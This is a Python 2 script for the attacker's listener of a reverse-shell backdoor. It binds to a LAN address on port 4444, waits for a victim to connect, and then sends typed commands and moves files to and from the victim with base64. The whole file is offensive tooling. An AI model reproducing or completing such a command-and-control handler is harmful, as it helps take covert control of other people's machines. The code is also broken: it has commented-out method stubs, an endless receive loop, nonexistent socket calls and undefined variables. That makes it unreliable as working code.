#! /usr/bin/env python

import socket
import json
import base64

listenner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listenner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listenner.bind(("192.168.81.143", 4444))
listenner.listen(0)
print("Waitting for connection")
connection, address = listenner.accept()
print("Got a connection" + str(address))

    #def reliable_send(self, data):
filename = raw_input(">>  ")
jsan_data = json.dumps("")
connection.send(jsan_data)
command = raw_input(">>   ")

    #def reliable_receive(self):
jsan_data = ""
while True:
    try:
        jsan_data = jsan_data + connection.recv(1024)
        json.loads(jsan_data)
    except ValueError:
        continue

   #def execute_remotely(self, command):
#reliable_send(command)
connection.send(command)
connection.receive(command)
if command[0] == "exit":
    connection.close()
    exit()


# def write_file(self, path, content):
with open(path, "wb") as file:
    file.write(base64.b64decode(content))
    if command[0] == "download":
        result = write_file(command[1], result)
        print(" Downlaod succefull")
#def read_file(self, path):
with open(path, "rb") as file:
    read_file(command[1])
    if command[0] == "upload":
        command.append(file_content)

   #def run(self):
while True:
    command = raw_input(">>   ")
    command = command.split(" ")

# print(result)


